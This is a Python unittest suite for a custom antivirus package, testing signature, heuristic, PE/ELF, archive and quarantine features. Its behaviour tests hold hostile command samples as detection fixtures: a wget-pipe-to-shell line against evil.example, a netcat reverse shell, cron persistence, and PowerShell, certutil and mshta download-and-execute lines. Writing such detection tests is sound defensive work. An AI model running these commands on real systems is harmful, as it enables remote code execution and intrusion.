"""Tests for the AntiVirus package.

Run with either:
    python3 -m unittest discover -s tests -v
    python3 -m pytest -v        # if pytest is installed
"""
from __future__ import annotations

import contextlib
import hashlib
import io
import json
import os
import shutil
import tempfile
import time
import unittest
from pathlib import Path

from antivirus.config import Config
from antivirus.models import Finding
from antivirus.quarantine import Quarantine
from antivirus.report import ReportWriter, render_report
from antivirus.scanner import ScanResult, Scanner, shannon_entropy
from antivirus.signatures import Signature, SignatureDB

ROOT = Path(__file__).resolve().parent.parent
BUNDLED_DB = ROOT / "data" / "signatures.json"

# The standard, harmless EICAR antivirus test string (not malware).
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


class App:
    """Fixture that wires config/db/scanner/quarantine into a temp dir."""

    def __init__(self, base: Path):
        self.config = Config()
        self.config.quarantine_dir = base / "quarantine"
        self.config.report_dir = base / "reports"
        self.config.signatures_file = base / "signatures.json"
        self.config.cache_dir = base / ".av-cache"
        self.config.baseline_dir = base / "baselines"
        self.config.registry_dir = base / "registry"
        if BUNDLED_DB.exists():
            self.config.signatures_file.parent.mkdir(parents=True,
                                                      exist_ok=True)
            shutil.copyfile(BUNDLED_DB, self.config.signatures_file)
        self.db = SignatureDB(self.config.signatures_file)
        self.scanner = Scanner(self.config, self.db)
        self.quarantine = Quarantine(self.config.quarantine_dir)
        from antivirus.kill import KillRegistry

        self.kill_registry = KillRegistry(self.config.registry_dir)


class ScannerTests(unittest.TestCase):
    def setUp(self):
        path = Path(tempfile.mkdtemp(prefix="av-test-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.app = App(path)

    def test_detects_eicar_by_hash(self):
        f = self.app.config.quarantine_dir.parent / "eicar.txt"
        f.write_bytes(EICAR)
        findings = self.app.scanner.scan_file(f)
        self.assertTrue(any(x.kind == "signature-hash" for x in findings))
        self.assertEqual(findings[0].severity, "critical")

    def test_detects_eicar_pattern_when_hash_differs(self):
        f = self.app.config.quarantine_dir.parent / "wrapped.bin"
        f.write_bytes(b"\x00\x01" * 50 + EICAR + b"\xff" * 50)
        findings = self.app.scanner.scan_file(f)
        self.assertTrue(any(x.kind == "signature-pattern" for x in findings))

    def test_clean_file_is_not_flagged(self):
        f = self.app.config.quarantine_dir.parent / "clean.txt"
        f.write_text("hello world\n" * 10)
        self.assertEqual(self.app.scanner.scan_file(f), [])

    def test_directory_walk(self):
        base = self.app.config.quarantine_dir.parent
        (base / "a.txt").write_text("fine")
        (base / "sub").mkdir()
        (base / "sub" / "b.txt").write_text("also fine")
        (base / "sub" / "eicar.txt").write_bytes(EICAR)
        result = self.app.scanner.scan_path(base)
        self.assertGreaterEqual(result.files_scanned, 3)
        self.assertEqual(len(result.findings), 1)
        self.assertTrue(result.findings[0].path.endswith("eicar.txt"))
        self.assertFalse(result.clean)

    def test_quarantine_dir_is_not_scanned(self):
        base = self.app.config.quarantine_dir.parent
        qfile = self.app.config.quarantine_dir / "files" / "hidden.bin"
        qfile.parent.mkdir(parents=True, exist_ok=True)
        qfile.write_bytes(EICAR)  # would be a threat if we scanned the quarantine
        result = self.app.scanner.scan_path(base)
        self.assertEqual(result.findings, [])

    def test_high_entropy_heuristic(self):
        import random

        f = self.app.config.quarantine_dir.parent / "packed.bin"
        f.write_bytes(random.Random(7).randbytes(300 * 1024))
        findings = self.app.scanner.scan_file(f)
        self.assertTrue(any(x.kind == "heuristic" for x in findings))

    def test_skips_files_over_max_size(self):
        f = self.app.config.quarantine_dir.parent / "big.bin"
        with open(f, "wb") as fh:
            fh.truncate(self.app.config.max_file_size + 1)
        result = self.app.scanner.scan_path(f)
        self.assertEqual(result.files_scanned, 0)
        self.assertEqual(result.files_skipped, 1)
        self.assertTrue(result.errors)


class EfficiencyTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        path = Path(tempfile.mkdtemp(prefix="av-eff-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.app = App(path)

    def _populate(self, base: Path) -> None:
        for i in range(30):
            (base / f"file-{i:03d}.txt").write_text(f"content {i}\n" * 20)
        (base / "infected.bin").write_bytes(b"\x00" * 32 + EICAR + b"\x00" * 32)

    def test_parallel_matches_serial(self):
        base = self.app.config.quarantine_dir.parent
        self._populate(base)
        serial = self.app.scanner.scan_path(base)  # threads default -> auto
        self.app.scanner.threads = 1
        one = self.app.scanner.scan_path(base)
        self.app.scanner.threads = 8
        parallel = self.app.scanner.scan_path(base)
        for res in (serial, one, parallel):
            # 30 ordinary + infected.bin + signatures.json copied in by App()
            self.assertEqual(res.files_scanned, 32)
            # infected.bin is EICAR with padding -> hash differs, pattern hits
            self.assertEqual(
                sorted((f.path, f.kind) for f in res.findings),
                [(str(base / "infected.bin"), "signature-pattern")],
            )
            self.assertEqual(res.bytes_scanned, serial.bytes_scanned)

    def test_heuristic_not_suppressed_after_earlier_finding(self):
        # Regression: the heuristic layer used to be gated on the
        # tree-wide findings list, so any earlier threat silently
        # disabled heuristics for every later file in a directory scan.
        import random

        base = self.app.config.quarantine_dir.parent
        (base / "a-infected.txt").write_bytes(EICAR)           # sorts first
        (base / "z-packed.bin").write_bytes(                   # sorts last
            random.Random(1).randbytes(300 * 1024))
        self.app.scanner.threads = 1  # sequential – the bug's scenario
        result = self.app.scanner.scan_path(base)
        kinds = {(f.path.rsplit("/", 1)[-1], f.kind) for f in result.findings}
        self.assertIn(("a-infected.txt", "signature-hash"), kinds)
        self.assertIn(("z-packed.bin", "heuristic"), kinds)

    def test_workers_parsing(self):
        scanner = self.app.scanner
        self.assertEqual(scanner._workers(), scanner._workers())  # stable
        scanner.threads = 1
        self.assertEqual(scanner._workers(), 1)
        scanner.threads = 0
        self.assertEqual(scanner._workers(), 1)
        scanner.threads = "4"
        self.assertEqual(scanner._workers(), 4)
        scanner.threads = "bogus"
        self.assertEqual(scanner._workers(), 1)

    def test_combined_regex_matches_multiple_patterns(self):
        db = self.app.db
        db.add(Signature(id="P1", name="P1", category="test", severity="low",
                         pattern=b"MARKER-ALPHA-111".decode()))
        db.add(Signature(id="P2", name="P2", category="test", severity="low",
                         pattern=b"MARKER-BETA-222".decode()))
        f = self.app.config.quarantine_dir.parent / "both.txt"
        f.write_text("x MARKER-ALPHA-111 y MARKER-BETA-222 z\n")
        findings = self.app.scanner.scan_file(f)
        self.assertEqual(sorted(x.name for x in findings), ["P1", "P2"])

    def test_combined_regex_fallback_on_bad_combined(self):
        # Two patterns that cannot be merged (clashing internal group names)
        # must fall back to per-pattern matching without errors.
        db = self.app.db
        db.add(Signature(id="C1", name="C1", category="test", severity="low",
                         pattern=r"(?P<x>a)"))
        db.add(Signature(id="C2", name="C2", category="test", severity="low",
                         pattern=r"(?P<x>b)"))
        self.app.scanner._sync_patterns()
        f = self.app.config.quarantine_dir.parent / "c.txt"
        f.write_text("a b\n")
        findings = self.app.scanner.scan_file(f)
        self.assertEqual(sorted(x.name for x in findings), ["C1", "C2"])


class QuarantineTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        path = Path(tempfile.mkdtemp(prefix="av-q-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.app = App(path)

    def _finding(self, path: Path) -> "Scanner":
        return self.app.scanner.scan_file(path)[0]

    def test_put_and_restore(self):
        f = self.app.config.quarantine_dir.parent / "victim.txt"
        f.write_bytes(EICAR)
        finding = self.app.scanner.scan_file(f)[0]
        item = self.app.quarantine.put(f, finding)
        self.assertFalse(f.exists())
        self.assertTrue(any(i.id == item.id for i in self.app.quarantine.items()))

        restored, target = self.app.quarantine.restore(item.id[:12])  # prefix match
        self.assertEqual(restored.id, item.id)
        self.assertEqual(target.read_bytes(), EICAR)
        self.assertEqual(self.app.quarantine.items(), [])

    def test_restore_to_cwd_when_parent_gone(self):
        f = self.app.config.quarantine_dir.parent / "sub" / "victim.txt"
        f.parent.mkdir(parents=True)
        f.write_bytes(EICAR)
        item = self.app.quarantine.put(f, self.app.scanner.scan_file(f)[0])
        shutil.rmtree(f.parent)
        cwd = os.getcwd()
        os.chdir(self.app.config.quarantine_dir.parent)
        try:
            _, target = self.app.quarantine.restore(item.id)
            self.assertEqual(target.parent, self.app.config.quarantine_dir.parent)
            self.assertTrue(target.exists())
        finally:
            os.chdir(cwd)

    def test_purge(self):
        f = self.app.config.quarantine_dir.parent / "victim.txt"
        f.write_bytes(EICAR)
        item = self.app.quarantine.put(f, self.app.scanner.scan_file(f)[0])
        self.app.quarantine.purge(item.id)
        self.assertEqual(self.app.quarantine.items(), [])
        self.assertFalse((self.app.quarantine.files_dir / f"{item.id}.quarantined").exists())

    def test_unknown_id_raises(self):
        with self.assertRaises(KeyError):
            self.app.quarantine.restore("nope")


class SignatureDBTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        path = Path(tempfile.mkdtemp(prefix="av-db-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.dbfile = path / "signatures.json"

    def test_add_and_reload(self):
        db = SignatureDB(self.dbfile)
        db.add(Signature(id="T1", name="T1", category="test", severity="low",
                         pattern="MY-TEST-STRING-XYZ"))
        self.assertTrue(self.dbfile.exists())

        db2 = SignatureDB(self.dbfile)
        self.assertEqual([s.id for s in db2.list()], ["T1"])

        scanner = Scanner(Config(), db2)
        base = self.dbfile.parent
        f = base / "x.txt"
        f.write_text("hello MY-TEST-STRING-XYZ world")
        findings = scanner.scan_file(f)
        self.assertTrue(any(x.name == "T1" for x in findings))

    def test_invalid_pattern_rejected(self):
        db = SignatureDB(self.dbfile)
        with self.assertRaises(ValueError):
            db.add(Signature(id="T2", name="T2", category="test",
                             severity="low", pattern="([unclosed"))

    def test_signature_without_any_matcher_rejected(self):
        db = SignatureDB(self.dbfile)
        with self.assertRaises(ValueError):
            db.add(Signature(id="T3", name="T3", category="test", severity="low"))


class BehaviorTests(unittest.TestCase):
    def setUp(self):
        path = Path(tempfile.mkdtemp(prefix="av-beh-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.base = path
        self.db = SignatureDB(path / "sig.json")  # empty db is fine
        self.scanner = Scanner(Config(), self.db, threads=1)

    def _scan(self, name: str, content, mode: str = "text") -> list:
        p = self.base / name
        if mode == "text":
            p.write_text(content)
        else:
            p.write_bytes(content)
        return self.scanner.scan_file(p)

    def _behavior(self, findings) -> list:
        return [f for f in findings if f.kind == "behavior"]

    def test_python_indicators(self):
        src = (
            "import base64, os, socket, subprocess\n"
            "os.system('id')\n"
            "subprocess.run('whoami', shell=True)\n"
            "s = socket.socket()\n"
            "s.connect(('10.0.0.9', 4444))\n"
            "exec(base64.b64decode('aGVsbG8='))\n"
        )
        names = {f.name for f in self._behavior(self._scan("x.py", src))}
        self.assertIn("Shell command execution", names)
        self.assertIn("Subprocess with shell=True", names)
        self.assertIn("Hardcoded network target", names)
        self.assertIn("Dynamic code execution (exec)", names)
        self.assertIn("Encoded payload handling", names)

    def test_python_constant_eval_not_flagged(self):
        src = "print(eval('1 + 1'))\n"
        names = {f.name for f in self._behavior(self._scan("c.py", src))}
        self.assertNotIn("Dynamic code execution (eval)", names)

    def test_python_unparseable_falls_back_to_regex(self):
        src = "def broken(:\n  exec(base64.b64decode(x))\n"
        findings = self._behavior(self._scan("broken.py", src))
        self.assertTrue(any("Dynamic code execution" in f.name for f in findings))

    def test_shell_indicators(self):
        sh = (
            "#!/bin/sh\n"
            "wget -qO- http://evil.example/x.sh | sh\n"
            "nc -e /bin/sh 10.0.0.9 4444\n"
            "echo '* * * * * /tmp/x' >> /etc/cron.d/miner\n"
            "echo x | base64 -d | bash\n"
        )
        names = {f.name for f in self._behavior(self._scan("s.sh", sh))}
        self.assertIn("Downloads a remote script and pipes it into a shell", names)
        self.assertIn("netcat with exec flag (reverse shell)", names)
        self.assertIn("Persistence mechanism (cron / service / shell rc / startup)", names)
        self.assertIn("Decodes embedded base64 and pipes it into a shell", names)

    def test_powershell_indicators(self):
        ps = (
            "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')\n"
            "$a = \"-ExecutionPolicy Bypass\"\n"
            "$t = New-Object System.Net.Sockets.TcpClient('10.0.0.9', 4444)\n"
        )
        names = {f.name for f in self._behavior(self._scan("a.ps1", ps))}
        self.assertIn("Download & execute", names)
        self.assertIn("Execution policy bypass", names)
        self.assertIn("Raw socket usage", names)

    def test_batch_indicators(self):
        bat = (
            "@echo off\n"
            "certutil -urlcache -f -split http://x.example/d.exe %%TEMP%%\\d.exe\n"
            "mshta http://x.example/x.hta\n"
        )
        names = {f.name for f in self._behavior(self._scan("d.bat", bat))}
        self.assertIn("certutil URL download (LOLBin)", names)
        self.assertIn("mshta remote/HTA script execution (LOLBin)", names)

    def test_pe_dangerous_imports(self):
        from antivirus.samples import SUSPICIOUS_PE_DLLS, build_sample_pe

        findings = self._behavior(self._scan("a.exe", build_sample_pe(SUSPICIOUS_PE_DLLS), mode="bytes"))
        names = {f.name for f in findings}
        self.assertIn("PE imports: Process-injection API set (remote alloc + write + thread)", names)
        self.assertIn("PE downloads AND executes code", names)
        sevs = {f.name: f.severity for f in findings}
        self.assertEqual(sevs["PE downloads AND executes code"], "high")

    def test_pe_benign_imports_clean(self):
        from antivirus.samples import BENIGN_PE_DLLS, build_sample_pe

        pe = build_sample_pe(BENIGN_PE_DLLS, reloc_rva=0x1010, debug_dir=True)
        self.assertEqual(self._behavior(self._scan("b.exe", pe, mode="bytes")), [])

    def test_non_executable_document_not_analysed(self):
        # Same dangerous text, but in a .txt document -> not executable-looking.
        findings = self._scan("notes.txt", "curl http://x.example/x.sh | sh\n")
        self.assertEqual(self._behavior(findings), [])
        self.assertEqual(findings, [])

    def test_suid_executable_flagged(self):
        p = self.base / "suid.sh"
        p.write_text("#!/bin/sh\necho hi\n")
        os.chmod(p, 0o4755)
        names = {f.name for f in self._behavior(self.scanner.scan_file(p))}
        self.assertIn("setuid executable", names)

    def test_behavior_can_be_disabled(self):
        sh = self.base / "s.sh"
        sh.write_text("curl http://x.example/x.sh | sh\n")
        self.assertTrue(self._behavior(self.scanner.scan_file(sh)))
        self.scanner.config.behavior_enabled = False
        self.assertEqual(self._behavior(self.scanner.scan_file(sh)), [])

    def test_large_file_skips_behavior_but_still_hashes(self):
        big = self.base / "big.sh"
        with open(big, "wb") as fh:
            fh.write(b"#!/bin/sh\n" + b"a" * (self.scanner.config.behavior_max_size + 1))
        findings = self.scanner.scan_file(big)
        # behaviour skipped (file > behaviour_max_size), hash layer still ran
        self.assertEqual(findings, [])
        self.assertGreater(big.stat().st_size, self.scanner.config.behavior_max_size)


class PeDebugTests(unittest.TestCase):
    """v1.3: static PE dissection (the 'debug report') + debug-derived indicators."""

    def test_parse_fields_suspicious(self):
        from antivirus.pe import parse_pe
        from antivirus.samples import build_suspicious_pe

        info = parse_pe(build_suspicious_pe())
        self.assertTrue(info.valid)
        self.assertFalse(info.is_64)
        self.assertEqual(info.machine_name, "i386")
        self.assertEqual(info.entry_point_rva, 0)
        self.assertEqual(info.exports, ["run_payload"])
        self.assertEqual(len(info.imports), 4)
        self.assertIn("URLDownloadToFileA", info.imports.get("wininet.dll", []))
        self.assertEqual(info.reloc_entries, 0)
        self.assertEqual(info.debug_dirs, 0)
        self.assertEqual(len(info.resources), 1)
        self.assertIn("VBScript (WScript.Shell)", info.resources[0].markers)

    def test_debug_indicators_suspicious(self):
        from antivirus.pe import parse_pe, pe_indicators
        from antivirus.samples import build_suspicious_pe

        names = {i.name for i in pe_indicators(parse_pe(build_suspicious_pe()))}
        for expected in (
            "ASLR disabled",
            "DEP (NX) disabled",
            "No entry point",
            "No base relocations",
            "No debug information",
            "PE imports: Process-injection API set (remote alloc + write + thread)",
            "PE downloads AND executes code",
        ):
            self.assertIn(expected, names)
        self.assertTrue(any("Embedded in resources: VBScript" in n for n in names))

    def test_packed_indicators(self):
        from antivirus.pe import parse_pe, pe_indicators
        from antivirus.samples import build_packed_pe

        names = {i.name for i in pe_indicators(parse_pe(build_packed_pe()))}
        for expected in ("RELOCS_STRIPPED", "Known packer section name",
                         "Packed/encrypted PE section", "No import table"):
            self.assertIn(expected, names)

    def test_clean_pe_zero_findings(self):
        from antivirus.pe import parse_pe, pe_indicators
        from antivirus.samples import build_clean_pe

        info = parse_pe(build_clean_pe())
        self.assertTrue(info.valid)
        self.assertEqual(pe_indicators(info), [])

    def test_pe32plus_imports(self):
        from antivirus.pe import parse_pe
        from antivirus.samples import SUSPICIOUS_PE_DLLS, _MACHINE_64, build_sample_pe

        info = parse_pe(build_sample_pe(SUSPICIOUS_PE_DLLS, machine=_MACHINE_64))
        self.assertTrue(info.valid)
        self.assertTrue(info.is_64)
        self.assertEqual(len(info.api_set), 7)

    def test_malformed_pe_never_crashes(self):
        from antivirus.pe import parse_pe, pe_indicators

        for blob in (b"", b"MZ", b"MZ" + b"\0" * 40, b"not a PE file at all" * 10):
            info = parse_pe(blob)
            self.assertFalse(info.valid)
            self.assertEqual(pe_indicators(info), [])

    def test_cli_pe_analyze_json(self):
        import contextlib
        import json as _json
        from io import StringIO

        from antivirus import cli
        from antivirus.samples import build_suspicious_pe

        base = Path(tempfile.mkdtemp(prefix="av-pe-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        p = base / "s.exe"
        p.write_bytes(build_suspicious_pe())
        buf = StringIO()
        with contextlib.redirect_stdout(buf):
            rc = cli.main(["pe", "analyze", str(p), "--json"])
        self.assertEqual(rc, 1)  # findings present -> non-zero exit
        payload = _json.loads(buf.getvalue())
        self.assertTrue(payload["valid"])
        self.assertIn("run_payload", payload["exports"])
        self.assertTrue(payload["indicators"])


class CacheTests(unittest.TestCase):
    """v1.5: the scan cache makes rescans of unchanged files free."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-cache-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.dir = base / "tree"
        self.dir.mkdir()

    def _write(self, name, content=b"clean text\n") -> Path:
        p = self.dir / name
        p.write_bytes(content)
        return p

    def test_rescan_is_served_from_cache(self):
        self._write("a.txt")
        self._write("b.txt", EICAR)
        first = self.app.scanner.scan_path(self.dir)
        self.assertEqual(first.files_cached, 0)
        self.assertEqual(len(first.findings), 1)
        second = self.app.scanner.scan_path(self.dir)
        self.assertEqual(second.files_cached, 2)
        self.assertEqual(second.files_scanned, 2)
        self.assertEqual({f.path for f in second.findings},
                         {str(self.dir / "b.txt")})

    def test_changed_file_is_rescanned(self):
        p = self._write("a.txt")
        self.app.scanner.scan_path(self.dir)
        p.write_bytes(EICAR)
        future = time.time() + 5  # guarantee a visible mtime change
        os.utime(p, (future, future))
        second = self.app.scanner.scan_path(self.dir)
        self.assertEqual(second.files_cached, 0)
        self.assertTrue(any(f.path == str(p) for f in second.findings))

    def test_profile_change_invalidates_cache(self):
        self._write("a.txt")
        self.app.scanner.scan_path(self.dir)
        self.app.config.behavior_enabled = False  # different engine profile
        second = self.app.scanner.scan_path(self.dir)
        self.assertEqual(second.files_cached, 0)

    def test_no_cache_flag_bypasses(self):
        self._write("a.txt")
        self.app.scanner.scan_path(self.dir)
        self.app.config.cache_enabled = False
        second = self.app.scanner.scan_path(self.dir)
        self.assertEqual(second.files_cached, 0)


class ArchiveTests(unittest.TestCase):
    """v1.5: ZIP contents are analysed in memory, never extracted."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-zip-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False

    def _scan(self, blob: bytes, name: str = "sneaky.zip"):
        p = self.base / name
        p.write_bytes(blob)
        return self.app.scanner.scan_path(p)

    def test_eicar_entry_detected_with_archive_path(self):
        from antivirus.samples import build_zip_sample

        result = self._scan(build_zip_sample())
        hits = [f for f in result.findings if "eicar" in f.path.lower()]
        self.assertTrue(hits)
        self.assertEqual(hits[0].kind, "signature-hash")
        self.assertTrue(hits[0].path.endswith("sneaky.zip!eicar-test.txt"))

    def test_zip_slip_entry_flagged(self):
        from antivirus.samples import build_zip_sample

        result = self._scan(build_zip_sample())
        self.assertTrue(any(f.name == "Archive path traversal (zip slip)"
                            for f in result.findings))

    def test_benign_entry_not_flagged(self):
        from antivirus.samples import build_zip_sample

        result = self._scan(build_zip_sample())
        self.assertFalse(any("notes.txt" in f.path for f in result.findings))

    def test_no_archives_flag_disables_entry_scan(self):
        from antivirus.samples import build_zip_sample

        self.app.scanner.config.archives_enabled = False
        result = self._scan(build_zip_sample())
        self.assertEqual([f for f in result.findings if "!" in f.path], [])

    def test_expansion_budget_stops_zip_bombs(self):
        import io
        import zipfile

        self.app.scanner.config.archive_expansion_max = 1024
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            for i in range(4):
                zf.writestr(f"big{i}.bin", os.urandom(4096))
        result = self._scan(buf.getvalue(), "bomb.zip")
        self.assertTrue(any(f.name == "Archive expansion limit exceeded"
                            for f in result.findings))

    def test_encrypted_entry_flagged(self):
        import io
        import zipfile

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("secret.txt", b"data")
        # The stdlib writer resets the general-purpose flags, so set the
        # "encrypted" bit (0x1) by hand in both headers.
        raw = bytearray(buf.getvalue())
        raw[6:8] = (int.from_bytes(raw[6:8], "little") | 0x1).to_bytes(2, "little")
        cdf = raw.find(b"PK\x01\x02")
        raw[cdf + 8:cdf + 10] = (
            int.from_bytes(raw[cdf + 8:cdf + 10], "little") | 0x1
        ).to_bytes(2, "little")
        result = self._scan(bytes(raw), "enc.zip")
        self.assertTrue(any(f.name == "Encrypted archive entry"
                            for f in result.findings))


class FastModeTests(unittest.TestCase):
    """v1.5: --fast runs hash + pattern layers only."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-fast-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False

    def test_fast_skips_behavior_and_entropy(self):
        (self.base / "evil.sh").write_text("#!/bin/sh\ncurl http://x | sh\n")
        (self.base / "packed.bin").write_bytes(os.urandom(300 * 1024))

        full = self.app.scanner.scan_path(self.base)
        self.assertTrue(any(f.kind == "behavior" for f in full.findings))
        self.assertTrue(any(f.kind == "heuristic" for f in full.findings))

        self.app.config.fast_mode = True
        fast = self.app.scanner.scan_path(self.base)
        self.assertFalse(any(f.kind in ("behavior", "heuristic")
                             for f in fast.findings))


class ExcludeTests(unittest.TestCase):
    """v1.5: --exclude GLOB skips matching files."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-exc-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False

    def test_exclude_globs(self):
        work = self.base / "work"
        work.mkdir()
        (work / "keep.txt").write_text("clean\n")
        (work / "skip.log").write_bytes(EICAR)
        logs = work / "logs"
        logs.mkdir()
        (logs / "x.log").write_bytes(EICAR)

        self.app.config.exclude_patterns = ("*.log",)
        result = self.app.scanner.scan_path(work)
        self.assertEqual(result.files_scanned, 1)
        self.assertTrue(result.clean)
        self.assertGreaterEqual(result.files_skipped, 2)


class SigRemoveTests(unittest.TestCase):
    def test_remove_roundtrip(self):
        base = Path(tempfile.mkdtemp(prefix="av-sig-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        dbfile = base / "sig.json"
        db = SignatureDB(dbfile)
        db.add(Signature(id="R1", name="R1", category="test",
                         severity="low", pattern="XYZ-UNIQUE-1"))
        removed = db.remove("R1")
        self.assertEqual(removed.id, "R1")
        self.assertEqual(SignatureDB(dbfile).list(), [])
        with self.assertRaises(KeyError):
            db.remove("R1")


class GuiTests(unittest.TestCase):
    """The GUI module must stay importable and honest without a display."""

    def test_module_importable_and_helpers(self):
        import antivirus.gui as g

        self.assertTrue(hasattr(g, "run_gui"))
        self.assertIsInstance(g.tk_available(), bool)
        f = Finding(path="/tmp/x.exe", kind="behavior", name="T",
                    severity="high", message="m", size=42)
        self.assertEqual(g.finding_row(f),
                         ("high", "T", "/tmp/x.exe", "behavior", "m"))
        for sev in ("critical", "high", "medium", "low", "info"):
            fg, bg = g.SEVERITY_COLORS[sev]
            self.assertTrue(fg.startswith("#") and bg.startswith("#"))

    def test_summarize(self):
        import antivirus.gui as g

        r = ScanResult(target="/x", started_at=time.time())
        r.finished_at = time.time()
        self.assertIn("CLEAN", g.summarize(r, {}))
        r.findings.append(Finding(path="/x", kind="behavior", name="T",
                                  severity="high", message="m"))
        s = g.summarize(r, {"/x": "deleted"})
        self.assertIn("INFECTED", s)
        self.assertIn("action(s) taken", s)

    def test_gui_command_degrades_gracefully_headless(self):
        import antivirus.gui as g

        if g.tk_available():
            self.skipTest("tkinter present – the GUI would actually open")
        from antivirus import cli

        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            rc = cli.main(["gui"])
        self.assertEqual(rc, 2)
        self.assertIn("Tkinter", buf.getvalue())


class MiscTests(unittest.TestCase):
    def test_shannon_entropy(self):
        self.assertEqual(shannon_entropy(b""), 0.0)
        self.assertEqual(shannon_entropy(b"aaaa"), 0.0)
        self.assertAlmostEqual(shannon_entropy(bytes(range(256)) * 10), 8.0)

    def test_scan_result_json_roundtrip(self):
        import time

        base = Path(tempfile.mkdtemp(prefix="av-rep-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        result = ScanResult(target=str(base), started_at=time.time())
        result.finished_at = time.time()
        writer = ReportWriter(base / "reports")
        path = writer.save(result, action="detect")
        self.assertTrue(path.exists())
        self.assertTrue(path.with_suffix(".txt").exists())
        self.assertEqual(writer.latest(), path)
        text = render_report(json.loads(path.read_text()))
        self.assertIn("CLEAN", text)


class ElfTests(unittest.TestCase):
    """v1.6: ELF import-table analysis (mirror of the PE layer)."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-elf-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base

    def test_suspicious_elf_import_indicators(self):
        from antivirus.behavior import analyze_file
        from antivirus.samples import build_suspicious_elf

        blob = build_suspicious_elf()
        p = self.base / "susp.elf"
        p.write_bytes(blob)
        findings = analyze_file(p, p.lstat(), blob)
        elf = [f for f in findings if f.name.startswith("ELF imports")]
        self.assertTrue(elf)
        self.assertIn("high", [f.severity for f in elf])

    def test_clean_elf_has_no_import_indicators(self):
        from antivirus.behavior import analyze_file
        from antivirus.samples import build_clean_elf

        blob = build_clean_elf()
        p = self.base / "clean.elf"
        p.write_bytes(blob)
        findings = analyze_file(p, p.lstat(), blob)
        self.assertEqual([f for f in findings if f.name.startswith("ELF imports")], [])

    def test_elf32_and_elf64_symbols(self):
        from antivirus.behavior import elf_imports
        from antivirus.samples import (
            SUSPICIOUS_ELF_SYMBOLS,
            build_clean_elf,
            build_sample_elf,
        )

        self.assertEqual(elf_imports(build_sample_elf(SUSPICIOUS_ELF_SYMBOLS)),
                         set(SUSPICIOUS_ELF_SYMBOLS))
        self.assertEqual(elf_imports(build_sample_elf(SUSPICIOUS_ELF_SYMBOLS,
                                                      elf64=True, machine=0x3E)),
                         set(SUSPICIOUS_ELF_SYMBOLS))
        clean = elf_imports(build_clean_elf())
        self.assertEqual(clean, {"printf", "exit", "write", "malloc", "strlen"})

    def test_elf_imports_never_crashes_on_garbage(self):
        from antivirus.behavior import elf_imports

        self.assertEqual(elf_imports(b""), set())
        self.assertEqual(elf_imports(b"\x7fELF" + os.urandom(200)), set())
        self.assertEqual(elf_imports(b"\x7fELF" * 10), set())


class TarArchiveTests(unittest.TestCase):
    """v1.6: TAR / GZIP contents analysed in memory (tar-slip detection)."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-tar-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False

    def _scan(self, blob: bytes, name: str):
        p = self.base / name
        p.write_bytes(blob)
        return self.app.scanner.scan_path(p)

    def test_tar_gzip_members_scanned(self):
        from antivirus.samples import build_tar_sample

        result = self._scan(build_tar_sample(), "sneaky.tar.gz")
        self.assertTrue(any(f.kind == "signature-hash" and
                            f.path.endswith("sneaky.tar.gz!eicar-test.txt")
                            for f in result.findings))
        self.assertTrue(any(f.name == "Archive path traversal (tar slip)"
                            for f in result.findings))

    def test_benign_tar_is_clean(self):
        import io
        import tarfile

        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            tf.addfile(tarfile.TarInfo("notes.txt"),
                       io.BytesIO(b"all good\n"))
        result = self._scan(buf.getvalue(), "benign.tar")
        self.assertEqual(result.findings, [])

    def test_gzip_plain_payload(self):
        import gzip

        p = self.base / "blob.gz"
        p.write_bytes(gzip.compress(EICAR))
        result = self.app.scanner.scan_path(p)
        self.assertTrue(any(f.kind == "signature-hash" and
                            f.path.endswith("blob.gz!member")
                            for f in result.findings))

    def test_tar_entry_cap(self):
        import io
        import tarfile

        self.app.scanner.config.archive_entries_max = 16
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            for i in range(40):
                ti = tarfile.TarInfo(f"f{i:03d}.txt")
                data = b"x" * 8
                ti.size = len(data)
                tf.addfile(ti, io.BytesIO(data))
        result = self._scan(buf.getvalue(), "many.tar")
        self.assertTrue(any(f.name == "Archive entry limit exceeded"
                            for f in result.findings))

    def test_corrupt_gzip_never_crashes(self):
        import gzip

        full = gzip.compress(b"payload " * 50)
        p = self.base / "bad.gz"
        p.write_bytes(full[: len(full) // 2])  # truncated stream
        result = self.app.scanner.scan_path(p)
